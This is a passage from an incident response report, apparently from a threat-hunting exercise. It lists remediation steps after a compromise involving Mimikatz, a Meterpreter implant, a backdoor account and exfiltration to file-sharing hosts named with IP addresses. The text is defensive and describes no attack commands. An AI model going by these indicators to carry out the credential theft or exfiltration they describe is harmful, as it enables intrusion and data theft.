The following response actions were recommended: (1) Isolating azuki-adminpc from the network to prevent ongoing C2 communication and data exfiltration; (2) Removing yuki.tanaka2 backdoor account and auditing all administrative group memberships; (3) Resetting yuki.tanaka account credentials and all passwords stored in the compromised KeePass database with mandatory MFA enrollment; (4) Deleting malicious artifacts including KB5044273-x64.7z payload, m.exe (Mimikatz), Meterpreter implant, and all staged archives; (5) Blocking network access to gofile.io (45.112.123.227) and litter.catbox.moe (162.159.130.233); (6) Implementing application control policies to prevent tar.exe, curl.exe, and robocopy.exe abuse; (7) Configuring named pipe monitoring and alerting for Meterpreter patterns; (8) Implementing RDP access restrictions through jump servers with MFA and network segmentation; (9) Deploying enhanced logging for credential access, named pipe creation, and staging directory activities; (10) Conducting mandatory security awareness training on password manager security and social engineering; (11) Enforcing KeePass key file usage and prohibiting plaintext master password storage; (12) Implementing offline backup strategy for credential databases and financial records stored separately from network-accessible locations to ensure recovery capability if online systems are destroyed or encrypted during follow-up attacks.

---
